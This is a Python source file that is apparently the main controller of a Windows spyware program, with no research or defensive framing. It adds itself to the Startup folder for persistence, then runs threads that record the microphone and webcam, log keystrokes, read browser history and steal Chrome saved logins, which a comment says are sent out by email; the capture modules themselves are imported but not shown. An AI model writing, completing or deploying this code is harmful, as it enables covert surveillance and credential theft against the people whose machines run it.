#!/usr/bin/env python
import audioaccess
import camaccess
import historyAccess
import loggerkey
import loginAccess
import sendEmail
import threading

import os
import winshell

"""
This is the main script that first creates a shortcut of itself in the startup folder
to add itself to the startup programs and load on startup.
Then it calls all the python scripts as threads to access microphone, cam, browser history, key logs, and browser login data
Then sends the login data via email.
"""

# access audio
def audio_function():
    audioaccess.start() 

# access camera
def cam_function():
    camaccess.start() 

# access browser's history
def history_function():
    historyAccess.start() 

# access browser's login data 
def login_function():
    loginAccess.start() 
    sendEmail.send()

# track key logs
def logger_function():
    loggerkey.start() 

# A function that creates a shortcut of the exe file and copies it to the startup folder to make the exe run on startup
def create_shortcut():
    try:
        dest_path = winshell.programs() + r"\Startup"
        winshell.CreateShortcut (Path=os.path.join (dest_path, 'Spices.lnk'),Target="./spicy.exe")

    except Exception:
        print("Failed")

# Main function
if __name__ == "__main__":
    
    create_shortcut()

    thread1 = threading.Thread(target = audio_function)
    thread1.start()
    print("Audio Access thread started...")

    thread2 = threading.Thread(target = cam_function)
    thread2.start()
    print("Cam Access thread finished...")

    thread3 = threading.Thread(target = logger_function)
    thread3.start()
    print("Key Logger Data Access thread started...")

    thread4 = threading.Thread(target = history_function)
    thread4.start()
    print("Chrome History Access thread started...")

    thread5 = threading.Thread(target = login_function)
    thread5.start()
    print("Chrome Login Data Access thread started...")

    
